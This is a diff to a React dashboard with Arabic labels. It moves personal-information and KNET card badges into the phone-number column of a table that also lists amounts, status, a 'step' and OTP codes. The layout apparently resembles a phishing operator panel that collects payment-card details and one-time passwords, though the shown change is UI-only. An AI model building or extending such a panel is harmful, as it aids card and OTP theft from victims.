@@ -514,13 +514,12 @@ export default function Dashboard() {
                   <thead>
                     <tr className="bg-slate-800/50 border-b border-slate-700/50">
                       {[
-                        { label: "الهاتف", key: null },
+                        { label: "الهاتف / المعلومات", key: null },
                         { label: "المبلغ", key: "amount" },
                         { label: "الحالة", key: "status" },
                         { label: "الخطوة", key: null },
                         { label: "OTP", key: null },
                         { label: "الوقت", key: "date" },
-                        { label: "المعلومات", key: null },
                         { label: "الإجراءات", key: null },
                       ].map(({ label, key }) => (
                         <th key={label} className={`px-4 py-4 text-right font-semibold text-slate-300 text-sm ${key ? "cursor-pointer hover:bg-slate-700/50 transition-colors" : ""}`} onClick={key ? () => toggleSort(key) : undefined}>
@@ -538,7 +537,23 @@ export default function Dashboard() {
                       return (
                         <tr key={r.id} className="border-b border-slate-800/50 hover:bg-slate-800/30 transition-colors" style={{ animationDelay: `${i * 30}ms` }}>
                           <td className="px-4 py-3">
-                            <span className="font-mono text-white text-sm">{r.phone_number || "—"}</span>
+                            <div className="flex items-center gap-2 flex-wrap">
+                              <span className="font-mono text-white text-sm">{r.phone_number || "—"}</span>
+                              <Badge
+                                variant="outline"
+                                className="cursor-pointer text-xs transition-all hover:scale-105 bg-gradient-to-r from-blue-500 to-cyan-500 text-white border-0"
+                                onClick={() => openDialog(r, "personal")}
+                              >
+                                <User className="h-3 w-3 ml-1" />معلومات
+                              </Badge>
+                              <Badge
+                                variant="outline"
+                                className="cursor-pointer text-xs transition-all hover:scale-105 bg-gradient-to-r from-violet-500 to-purple-600 text-white border-0"
+                                onClick={() => openDialog(r, "card")}
+                              >
+                                <CreditCard className="h-3 w-3 ml-1" />KNET
+                              </Badge>
+                            </div>
                           </td>
                           <td className="px-4 py-3">
                             {r.amount ? <Badge variant="outline" className="font-mono text-emerald-400 border-emerald-500/30">{r.amount}</Badge> : <span className="text-slate-500">—</span>}
@@ -558,24 +573,6 @@ export default function Dashboard() {
                             <div className="flex items-center gap-1 text-sm text-slate-400">
                               <Clock className="h-3 w-3 flex-shrink-0" />
                               <span className="whitespace-nowrap">{r.created_date ? formatDistanceToNow(new Date(r.created_date), { addSuffix: true, locale: ar }) : "—"}</span>
-                            </div>
-                          </td>
-                          <td className="px-4 py-3">
-                            <div className="flex gap-1 flex-wrap">
-                              <Badge
-                                variant="outline"
-                                className="cursor-pointer text-xs transition-all hover:scale-105 bg-gradient-to-r from-blue-500 to-cyan-500 text-white border-0"
-                                onClick={() => openDialog(r, "personal")}
-                              >
-                                <User className="h-3 w-3 ml-1" />معلومات
-                              </Badge>
-                              <Badge
-                                variant="outline"
-                                className="cursor-pointer text-xs transition-all hover:scale-105 bg-gradient-to-r from-violet-500 to-purple-600 text-white border-0"
-                                onClick={() => openDialog(r, "card")}
-                              >
-                                <CreditCard className="h-3 w-3 ml-1" />KNET
-                              </Badge>
                             </div>
                           </td>
                           <td className="px-4 py-3">
